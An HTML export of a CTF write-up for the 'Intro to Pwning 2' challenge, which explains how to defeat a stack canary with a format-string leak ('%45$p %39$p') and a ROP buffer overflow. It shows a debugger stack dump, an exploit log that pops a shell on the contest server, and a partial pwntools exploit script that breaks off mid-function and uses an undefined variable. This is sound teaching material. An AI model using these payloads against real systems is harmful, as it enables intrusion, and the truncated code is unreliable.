@@ -1,0 +1,458 @@
+<!DOCTYPE html><html><head>
+      <title>writeup</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      
+      
+      
+      
+
+      
+      
+      
+      
+      
+      
+      
+
+      <style>
+      pre {
+  font-family: Menlo, Monaco, Consolas, 'Courier New', monospace;
+  direction: ltr;
+  text-align: left;
+  white-space: pre;
+  word-spacing: normal;
+  word-break: normal;
+  word-wrap: normal;
+  padding: 1em;
+  margin: .5em 0;
+  overflow: auto;
+  line-height: 1.5;
+  tab-size: 4;
+  hyphens: none;
+  color: #F8F8F2;
+  background-color: #323232 !important;
+  border: #515151;
+  border-radius: 3px;
+}
+pre[class*="language-"] {
+  padding: 1em;
+}
+code[class*="language-"] .token.comment,
+pre[class*="language-"] .token.comment,
+code[class*="language-"] .token.prolog,
+pre[class*="language-"] .token.prolog,
+code[class*="language-"] .token.doctype,
+pre[class*="language-"] .token.doctype,
+code[class*="language-"] .token.cdata,
+pre[class*="language-"] .token.cdata {
+  color: #75715E;
+}
+code[class*="language-"] .token.punctuation,
+pre[class*="language-"] .token.punctuation {
+  color: inherit;
+}
+code[class*="language-"] .namespace,
+pre[class*="language-"] .namespace {
+  opacity: .7;
+}
+code[class*="language-"] .token.property,
+pre[class*="language-"] .token.property,
+code[class*="language-"] .token.tag,
+pre[class*="language-"] .token.tag,
+code[class*="language-"] .token.boolean,
+pre[class*="language-"] .token.boolean,
+code[class*="language-"] .token.number,
+pre[class*="language-"] .token.number,
+code[class*="language-"] .token.function-name,
+pre[class*="language-"] .token.function-name,
+code[class*="language-"] .token.constant,
+pre[class*="language-"] .token.constant,
+code[class*="language-"] .token.symbol,
+pre[class*="language-"] .token.symbol,
+code[class*="language-"] .token.deleted,
+pre[class*="language-"] .token.deleted {
+  color: #AE81FF;
+}
+code[class*="language-"] .token.selector,
+pre[class*="language-"] .token.selector,
+code[class*="language-"] .token.attr-name,
+pre[class*="language-"] .token.attr-name,
+code[class*="language-"] .token.string,
+pre[class*="language-"] .token.string,
+code[class*="language-"] .token.char,
+pre[class*="language-"] .token.char,
+code[class*="language-"] .token.builtin,
+pre[class*="language-"] .token.builtin,
+code[class*="language-"] .token.inserted,
+pre[class*="language-"] .token.inserted {
+  color: #E6DB74;
+}
+code[class*="language-"] .token.entity,
+pre[class*="language-"] .token.entity {
+  color: #AE81FF;
+}
+code[class*="language-"] .token.url,
+pre[class*="language-"] .token.url {
+  color: #CCC;
+}
+code[class*="language-"] .token.operator,
+pre[class*="language-"] .token.operator {
+  color: #F92672;
+}
+code[class*="language-"] .token.atrule,
+pre[class*="language-"] .token.atrule,
+code[class*="language-"] .token.attr-value,
+pre[class*="language-"] .token.attr-value,
+code[class*="language-"] .token.keyword,
+pre[class*="language-"] .token.keyword {
+  color: #66D9EF;
+}
+code[class*="language-"] .token.function,
+pre[class*="language-"] .token.function {
+  color: #A6E22E;
+}
+code[class*="language-"] .token.class-name,
+pre[class*="language-"] .token.class-name {
+  color: #A6E22E;
+}
+code[class*="language-"] .token.regex,
+pre[class*="language-"] .token.regex {
+  color: #AE81FF;
+}
+code[class*="language-"] .token.important,
+pre[class*="language-"] .token.important,
+code[class*="language-"] .token.variable,
+pre[class*="language-"] .token.variable {
+  color: #A6E22E;
+}
+code[class*="language-"] .token.important,
+pre[class*="language-"] .token.important,
+code[class*="language-"] .token.bold,
+pre[class*="language-"] .token.bold {
+  font-weight: bold;
+}
+code[class*="language-"] .token.italic,
+pre[class*="language-"] .token.italic {
+  font-style: italic;
+}
+code[class*="language-"] .token.entity,
+pre[class*="language-"] .token.entity {
+  cursor: help;
+}
+
+/* highlight */
+pre[data-line] {
+  position: relative;
+  padding: 1em 0 1em 3em;
+}
+pre[data-line] .line-highlight-wrapper {
+  position: absolute;
+  top: 0;
+  left: 0;
+  background-color: transparent;
+  display: block;
+  width: 100%;
+}
+pre[data-line] .line-highlight {
+  position: absolute;
+  left: 0;
+  right: 0;
+  padding: inherit 0;
+  margin-top: 1em;
+  background: rgba(153, 122, 102, 0.08);
+  background: linear-gradient(to right, rgba(153, 122, 102, 0.1) 70%, rgba(153, 122, 102, 0));
+  pointer-events: none;
+  line-height: inherit;
+  white-space: pre;
+}
+pre[data-line] .line-highlight:before,
+pre[data-line] .line-highlight[data-end]:after {
+  content: attr(data-start);
+  position: absolute;
+  top: .4em;
+  left: .6em;
+  min-width: 1em;
+  padding: 0 .5em;
+  background-color: rgba(153, 122, 102, 0.4);
+  color: #f5f2f0;
+  font: bold 65%/1.5 sans-serif;
+  text-align: center;
+  vertical-align: .3em;
+  border-radius: 999px;
+  text-shadow: none;
+  box-shadow: 0 1px white;
+}
+pre[data-line] .line-highlight[data-end]:after {
+  content: attr(data-end);
+  top: auto;
+  bottom: .4em;
+}
+html body{font-family:"Helvetica Neue",Helvetica,"Segoe UI",Arial,freesans,sans-serif;font-size:16px;line-height:1.6;color:#F8F8F2;background-color:#282828;overflow:initial;box-sizing:border-box;word-wrap:break-word}html body>:first-child{margin-top:0}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{line-height:1.2;margin-top:1em;margin-bottom:16px;color:#fff}html body h1{font-size:2.25em;font-weight:300;padding-bottom:.3em}html body h2{font-size:1.75em;font-weight:400;padding-bottom:.3em}html body h3{font-size:1.5em;font-weight:500}html body h4{font-size:1.25em;font-weight:600}html body h5{font-size:1.1em;font-weight:600}html body h6{font-size:1em;font-weight:600}html body h1,html body h2,html body h3,html body h4,html body h5{font-weight:600}html body h5{font-size:1em}html body h6{color:#dbdbbd}html body strong{color:#fff}html body del{color:#dbdbbd}html body a:not([href]){color:inherit;text-decoration:none}html body a{color:#08c;text-decoration:none}html body a:hover{color:#00a3f5;text-decoration:none}html body img{max-width:100%}html body>p{margin-top:0;margin-bottom:16px;word-wrap:break-word}html body>ul,html body>ol{margin-bottom:16px}html body ul,html body ol{padding-left:2em}html body ul.no-list,html body ol.no-list{padding:0;list-style-type:none}html body ul ul,html body ul ol,html body ol ol,html body ol ul{margin-top:0;margin-bottom:0}html body li{margin-bottom:0}html body li.task-list-item{list-style:none}html body li>p{margin-top:0;margin-bottom:0}html body .task-list-item-checkbox{margin:0 .2em .25em -1.8em;vertical-align:middle}html body .task-list-item-checkbox:hover{cursor:pointer}html body blockquote{margin:16px 0;font-size:inherit;padding:0 15px;color:#dbdbbd;border-left:4px solid #515151}html body blockquote>:first-child{margin-top:0}html body blockquote>:last-child{margin-bottom:0}html body hr{height:4px;margin:32px 0;background-color:#515151;border:0 none}html body table{margin:10px 0 15px 0;border-collapse:collapse;border-spacing:0;display:block;width:100%;overflow:auto;word-break:normal;word-break:keep-all}html body table th{font-weight:bold;color:#fff}html body table td,html body table th{border:1px solid #515151;padding:6px 13px}html body dl{padding:0}html body dl dt{padding:0;margin-top:16px;font-size:1em;font-style:italic;font-weight:bold}html body dl dd{padding:0 16px;margin-bottom:16px}html body code{font-family:Menlo,Monaco,Consolas,'Courier New',monospace;font-size:.85em !important;color:#fff;background-color:#3c3c3c;border-radius:3px;padding:.2em 0}html body code::before,html body code::after{letter-spacing:-0.2em;content:"\00a0"}html body pre>code{padding:0;margin:0;font-size:.85em !important;word-break:normal;white-space:pre;background:transparent;border:0}html body .highlight{margin-bottom:16px}html body .highlight pre,html body pre{padding:1em;overflow:auto;font-size:.85em !important;line-height:1.45;border:#515151;border-radius:3px}html body .highlight pre{margin-bottom:0;word-break:normal}html body pre code,html body pre tt{display:inline;max-width:initial;padding:0;margin:0;overflow:initial;line-height:inherit;word-wrap:normal;background-color:transparent;border:0}html body pre code:before,html body pre tt:before,html body pre code:after,html body pre tt:after{content:normal}html body p,html body blockquote,html body ul,html body ol,html body dl,html body pre{margin-top:0;margin-bottom:16px}html body kbd{color:#fff;border:1px solid #515151;border-bottom:2px solid #424242;padding:2px 4px;background-color:#3c3c3c;border-radius:3px}@media print{html body{background-color:#282828}html body h1,html body h2,html body h3,html body h4,html body h5,html body h6{color:#fff;page-break-after:avoid}html body blockquote{color:#dbdbbd}html body pre{page-break-inside:avoid}html body table{display:table}html body img{display:block;max-width:100%;max-height:100%}html body pre,html body code{word-wrap:break-word;white-space:pre}}.markdown-preview{width:100%;height:100%;box-sizing:border-box}.markdown-preview .pagebreak,.markdown-preview .newpage{page-break-before:always}.markdown-preview pre.line-numbers{position:relative;padding-left:3.8em;counter-reset:linenumber}.markdown-preview pre.line-numbers>code{position:relative}.markdown-preview pre.line-numbers .line-numbers-rows{position:absolute;pointer-events:none;top:1em;font-size:100%;left:0;width:3em;letter-spacing:-1px;border-right:1px solid #999;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.markdown-preview pre.line-numbers .line-numbers-rows>span{pointer-events:none;display:block;counter-increment:linenumber}.markdown-preview pre.line-numbers .line-numbers-rows>span:before{content:counter(linenumber);color:#999;display:block;padding-right:.8em;text-align:right}.markdown-preview .mathjax-exps .MathJax_Display{text-align:center !important}.markdown-preview:not([for="preview"]) .code-chunk .btn-group{display:none}.markdown-preview:not([for="preview"]) .code-chunk .status{display:none}.markdown-preview:not([for="preview"]) .code-chunk .output-div{margin-bottom:16px}.scrollbar-style::-webkit-scrollbar{width:8px}.scrollbar-style::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}.scrollbar-style::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode]){position:relative;width:100%;height:100%;top:0;left:0;margin:0;padding:0;overflow:auto}html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{position:relative;top:0}@media screen and (min-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em calc(50% - 457px + 2em)}}@media screen and (max-width:914px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode]) .markdown-preview{font-size:14px !important;padding:1em}}@media print{html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{display:none}}html body[for="html-export"]:not([data-presentation-mode]) #sidebar-toc-btn{position:fixed;bottom:8px;left:8px;font-size:28px;cursor:pointer;color:inherit;z-index:99;width:32px;text-align:center;opacity:.4}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] #sidebar-toc-btn{opacity:1}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc{position:fixed;top:0;left:0;width:300px;height:100%;padding:32px 0 48px 0;font-size:14px;box-shadow:0 0 4px rgba(150,150,150,0.33);box-sizing:border-box;overflow:auto;background-color:inherit}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar{width:8px}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-track{border-radius:10px;background-color:transparent}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc::-webkit-scrollbar-thumb{border-radius:5px;background-color:rgba(150,150,150,0.66);border:4px solid rgba(150,150,150,0.66);background-clip:content-box}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc a{text-decoration:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{padding:0 1.6em;margin-top:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc li{margin-bottom:.8em}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .md-sidebar-toc ul{list-style-type:none}html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{left:300px;width:calc(100% -  300px);padding:2em calc(50% - 457px -  150px);margin:0;box-sizing:border-box}@media screen and (max-width:1274px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{padding:2em}}@media screen and (max-width:450px){html body[for="html-export"]:not([data-presentation-mode])[html-show-sidebar-toc] .markdown-preview{width:100%}}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .markdown-preview{left:50%;transform:translateX(-50%)}html body[for="html-export"]:not([data-presentation-mode]):not([html-show-sidebar-toc]) .md-sidebar-toc{display:none}
+/* Please visit the URL below for more information: */
+/*   https://shd101wyy.github.io/markdown-preview-enhanced/#/customize-css */
+
+      </style>
+    </head>
+    <body for="html-export">
+      <div class="mume markdown-preview  ">
+      <style>pre {
+  max-height: 500px;
+}
+blockquote {
+  background-color: #323232 !important;
+}
+</style>
+<h1 class="mume-header" id="intro-to-pwning-2-localo">Intro to Pwning 2 - localo</h1>
+
+<p><strong>Category:</strong> Pwn<br>
+<strong>Difficulty:</strong> Baby<br>
+<strong>Author:</strong> LiveOverflow<br>
+<strong>Dependencies:</strong> Intro to Pwning 1</p>
+<h2 class="mume-header" id="description">Description</h2>
+
+<blockquote>
+<p>This is a introductory challenge for exploiting Linux binaries with memory corruptions. Nowodays there are quite a few mitigations that make it not as straight forward as it used to be. So in order to introduce players to pwnable challenges, LiveOverflow created a video walkthrough of the first challenge. An alternative writeup can also be found by 0x4d5a. More resources can also be found here.</p>
+<p>Service running at: <a href="http://hax1.allesctf.net:9101">hax1.allesctf.net:9101</a></p>
+</blockquote>
+<h2 class="mume-header" id="summery">Summery</h2>
+
+<p>This is the writeup for the second part of the <code>Intro to Pwning</code> series. This writeup depends on my writeup for <code>Intro to Pwning 1</code>.<br>
+The code for the second part is the same as for the first part, except that we are now a <code>Ravenclaw</code> and the program asks for the flag of the first part. But more important it has stack-protector enabled, this is the first mitigation I suggested.</p>
+<h2 class="mume-header" id="solution">Solution</h2>
+
+<p>With the preparation done in the last writeup the only thing that is needed is to leak the stack cookie and use that in the buffer-overflow.</p>
+<p>We can again use <code>telescope</code> to get the right offset.</p>
+<style>
+.ansi2html-content{
+	background-color: transparent !important;
+	padding: 0;
+}
+body > div > div{
+	background-color: #323232;
+	padding: 1em;
+}
+</style>
+<div>
+
+
+<style type="text/css">
+.ansi2html-content { display: inline; white-space: pre-wrap; word-wrap: break-word; }
+.body_foreground { color: #AAAAAA; }
+.body_background { background-color: #000000; }
+.body_foreground > .bold,.bold > .body_foreground, body.body_foreground > pre > .bold { color: #FFFFFF; font-weight: normal; }
+.inv_foreground { color: #000000; }
+.inv_background { background-color: #AAAAAA; }
+.ansi1 { font-weight: bold; }
+.ansi31 { color: #aa0000; }
+.ansi33 { color: #aa5500; }
+.ansi38-15 { color: #ffffff; }
+.ansi38-141 { color: #7e54d2; }
+.ansi38-81 { color: #2aa8d2; }
+.ansi38-148 { color: #7ea800; }
+</style>
+
+
+<pre class="ansi2html-content">00:0000&#x2502; <span class="ansi1">rsp </span> <span class="ansi33">0x7fff7a715648</span> &#x2014;&#x25B8; <span class="ansi31">0x55c35c3e2ce8</span> &#x25C2;&#x2014; <span class="ansi38-148">nop</span><span class="ansi38-15">    </span>
+01:0008&#x2502; <span class="ansi1">rdi </span> <span class="ansi33">0x7fff7a715650</span> &#x25C2;&#x2014; &apos;AAAA%45$p BBBB%39$p&apos;
+02:0010&#x2502; <span class="ansi1">    </span> <span class="ansi33">0x7fff7a715658</span> &#x25C2;&#x2014; &apos;p BBBB%39$p&apos;
+03:0018&#x2502; <span class="ansi1">    </span> <span class="ansi33">0x7fff7a715660</span> &#x25C2;&#x2014; 0x7d474100702439 /* &apos;9$p&apos; */
+04:0020&#x2502; <span class="ansi1">    </span> <span class="ansi33">0x7fff7a715668</span> &#x25C2;&#x2014; 0x0
+... &#x2193;
+20:0100&#x2502; <span class="ansi1">    </span> <span class="ansi33">0x7fff7a715748</span> &#x25C2;&#x2014; 0x4a00000000000000
+21:0108&#x2502; <span class="ansi1">    </span> <span class="ansi33">0x7fff7a715750</span> &#x2014;&#x25B8; <span class="ansi33">0x7fff7a715860</span> &#x25C2;&#x2014; 0x1
+22:0110&#x2502; <span class="ansi1">    </span> <span class="ansi33">0x7fff7a715758</span> &#x25C2;&#x2014; 0x4a1d60d2b9051500
+23:0118&#x2502; <span class="ansi1">rbp </span> <span class="ansi33">0x7fff7a715760</span> &#x2014;&#x25B8; <span class="ansi33">0x7fff7a715780</span> &#x2014;&#x25B8; <span class="ansi31">0x55c35c3e2de0</span> &#x25C2;&#x2014; <span class="ansi38-148">push</span><span class="ansi38-15">   </span><span class="ansi38-81">r15</span>
+24:0120&#x2502; <span class="ansi1">    </span> <span class="ansi33">0x7fff7a715768</span> &#x2014;&#x25B8; <span class="ansi31">0x55c35c3e2dc5</span> &#x25C2;&#x2014; <span class="ansi38-148">mov</span><span class="ansi38-15">    </span><span class="ansi38-81">eax</span><span class="ansi38-15">,</span><span class="ansi38-15"> </span><span class="ansi38-141">0</span>
+25:0128&#x2502; <span class="ansi1">    </span> <span class="ansi33">0x7fff7a715770</span> &#x2014;&#x25B8; <span class="ansi33">0x7fff7a715868</span> &#x2014;&#x25B8; <span class="ansi33">0x7fff7a717824</span> &#x25C2;&#x2014; &apos;/ctf/pwn2&apos;
+26:0130&#x2502; <span class="ansi1">    </span> <span class="ansi33">0x7fff7a715778</span> &#x25C2;&#x2014; 0x100000000
+27:0138&#x2502; <span class="ansi1">    </span> <span class="ansi33">0x7fff7a715780</span> &#x2014;&#x25B8; <span class="ansi31">0x55c35c3e2de0</span> &#x25C2;&#x2014; <span class="ansi38-148">push</span><span class="ansi38-15">   </span><span class="ansi38-81">r15</span>
+28:0140&#x2502; <span class="ansi1">    </span> <span class="ansi33">0x7fff7a715788</span> &#x2014;&#x25B8; <span class="ansi31">0x7f352ea90b97 (__libc_start_main+231)</span> &#x25C2;&#x2014; <span class="ansi38-148">mov</span><span class="ansi38-15">    </span><span class="ansi38-81">edi</span><span class="ansi38-15">,</span><span class="ansi38-15"> </span><span class="ansi38-81">eax</span>
+</pre>
+
+
+</div>  
+<p>The stack cookie is the random looking thing (<em>22</em>)</p>
+<p>We can leak it like we leak <code>__libc_start_main+231</code></p>
+<p>Our payload should be something like <code>%45$p %39$p</code> the first one will leak <code>__libc_start_main+231</code> (<code>0x05+0x28=45</code>) and the second one will leak the stack cookie (<code>0x05+0x22=39</code>)</p>
+<p>With minimal changes to the exploit of <code>Intro to Pwning 1</code> the exploit just works.<br>
+<strong>Caution: The flag in the C code does not match the flag in the binary, use <code>strings</code> to get it</strong></p>
+<div>
+
+
+<style type="text/css">
+.ansi2html-content { display: inline; white-space: pre-wrap; word-wrap: break-word; }
+.body_foreground { color: #AAAAAA; }
+.body_background { background-color: #000000; }
+.body_foreground > .bold,.bold > .body_foreground, body.body_foreground > pre > .bold { color: #FFFFFF; font-weight: normal; }
+.inv_foreground { color: #000000; }
+.inv_background { background-color: #AAAAAA; }
+.ansi32 { color: #00aa00; }
+</style>
+
+
+<pre class="ansi2html-content">$ ./rop remote
+[*] &apos;/ctf/pwn2&apos;
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[x] Opening connection to hax1.allesctf.net on port 9101
+[x] Opening connection to hax1.allesctf.net on port 9101: Trying 147.75.85.99
+[+] Opening connection to hax1.allesctf.net on port 9101: Done
+[*] &apos;/ctf/libc.so&apos;
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] __libc_start_main+243: <span class="ansi32">0x7efd9b95d1e3</span>
+[+] Libc base address: <span class="ansi32">0x7efd9b936000</span>
+[+] stack canary: <span class="ansi32">0x682a994c66320e00</span>
+[*] Loaded 195 cached gadgets for &apos;libc.so&apos;
+[*] Switching to interactive mode
+~ Protego!
+$ ls
+flag
+pwn2
+ynetd
+$ cat flag
+CSCG{NOW_GET_VOLDEMORT}
+$ exit
+[*] Got EOF while reading in interactive
+[*] Interrupted
+</pre>
+
+
+</div>  
+<h2 class="mume-header" id="code">Code</h2>
+
+<pre data-role="codeBlock" data-info="py" class="language-python"><span class="token comment">#!/usr/bin/env python3</span>
+<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">from</span> huepy <span class="token keyword">import</span> <span class="token operator">*</span>
+<span class="token keyword">import</span> sys
+<span class="token keyword">import</span> os
+<span class="token keyword">import</span> socket
+<span class="token keyword">import</span> subprocess
+<span class="token keyword">import</span> re
+
+vuln_host <span class="token operator">=</span> <span class="token string">&apos;hax1.allesctf.net&apos;</span><span class="token comment">#&apos;127.0.0.1&apos;</span>
+vuln_port <span class="token operator">=</span> <span class="token string">&apos;9101&apos;</span>
+
+app_path <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">&apos;/pwn2&apos;</span>
+
+lo <span class="token operator">=</span> <span class="token keyword">not</span> <span class="token string">&apos;remote&apos;</span> <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv
+dbg <span class="token operator">=</span> <span class="token string">&apos;dbg&apos;</span> <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv <span class="token keyword">or</span> <span class="token string">&apos;debug&apos;</span> <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv
+
+<span class="token keyword">if</span> dbg<span class="token punctuation">:</span>
+    log<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
+
+break_main <span class="token operator">=</span> <span class="token string">&apos;break_main&apos;</span> <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv
+buffer_overflow <span class="token operator">=</span> <span class="token string">&apos;buffer_overflow&apos;</span> <span class="token keyword">in</span> sys<span class="token punctuation">.</span>argv
+
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">&apos;linux&apos;</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">&apos;amd64&apos;</span><span class="token punctuation">,</span> bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span> terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">&apos;tmux&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;splitw&apos;</span><span class="token punctuation">,</span> <span class="token string">&apos;-h&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">init_dbg</span><span class="token punctuation">(</span>app_path<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    args <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+    <span class="token keyword">if</span> break_main <span class="token keyword">and</span> <span class="token keyword">not</span> buffer_overflow<span class="token punctuation">:</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;set stop-on-solib-events 1&apos;</span><span class="token punctuation">)</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;continue&apos;</span><span class="token punctuation">)</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;continue&apos;</span><span class="token punctuation">)</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;break __libc_start_main&apos;</span><span class="token punctuation">)</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;commands&apos;</span><span class="token punctuation">)</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;break *$rdi&apos;</span><span class="token punctuation">)</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;continue&apos;</span><span class="token punctuation">)</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;end&apos;</span><span class="token punctuation">)</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;continue&apos;</span><span class="token punctuation">)</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;delete&apos;</span><span class="token punctuation">)</span>
+    <span class="token keyword">elif</span> buffer_overflow<span class="token punctuation">:</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;set context-sections &quot;&quot;&apos;</span><span class="token punctuation">)</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;define hook-stop&apos;</span><span class="token punctuation">)</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;printf &quot;cyclic: %p\\n&quot;, *((int *)$rsp)&apos;</span><span class="token punctuation">)</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;python __import__(&quot;time&quot;).sleep(10000)&apos;</span><span class="token punctuation">)</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;end&apos;</span><span class="token punctuation">)</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;continue&apos;</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        args<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">&apos;continue&apos;</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> gdb<span class="token punctuation">.</span>debug<span class="token punctuation">(</span>app_path<span class="token punctuation">,</span> <span class="token string">&quot;\n&quot;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+
+elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>app_path<span class="token punctuation">)</span>
+<span class="token keyword">if</span> lo<span class="token punctuation">:</span>
+    p <span class="token operator">=</span> process<span class="token punctuation">(</span>app_path<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> dbg <span class="token keyword">else</span> init_dbg<span class="token punctuation">(</span>app_path<span class="token punctuation">)</span>
+    lib <span class="token operator">=</span> <span class="token string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>
+<span class="token keyword">else</span><span class="token punctuation">:</span>
+    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>vuln_host<span class="token punctuation">,</span>vuln_port<span class="token punctuation">)</span>
+    lib <span class="token operator">=</span> <span class="token string">&quot;libc.so&quot;</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>lib<span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">nop_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span>libc<span class="token punctuation">)</span>
+    rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>search<span class="token punctuation">(</span>regs<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> order <span class="token operator">=</span> <span class="token string">&apos;regs&apos;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">leak_libc_start_main</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    code <span class="token operator">=</span> libc<span class="token punctuation">.</span>disasm<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">&apos;__libc_start_main&apos;</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0x500</span><span class="token punctuation">)</span>
+    r <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span><span class="token string">r&quot;.*call.*rax.*&quot;</span><span class="token punctuation">,</span>code<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">:</span>
+        offset <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">&quot;:&quot;</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>asm<span class="token punctuation">(</span><span class="token string">&apos;call rax&apos;</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">&quot;__libc_start_main+%d: &quot;</span><span class="token operator">%</span><span class="token punctuation">(</span>offset<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">&apos;__libc_start_main&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> green<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>leak<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        libc<span class="token punctuation">.</span>address <span class="token operator">=</span> leak <span class="token operator">-</span>offset
+        <span class="token keyword">return</span>
+    log<span class="token punctuation">.</span>error<span class="token punctuation">(</span><span class="token string">&quot;failed to leak libc, can&apos;t calculate base address&quot;</span><span class="token punctuation">)</span>
+    exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">shell_system</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
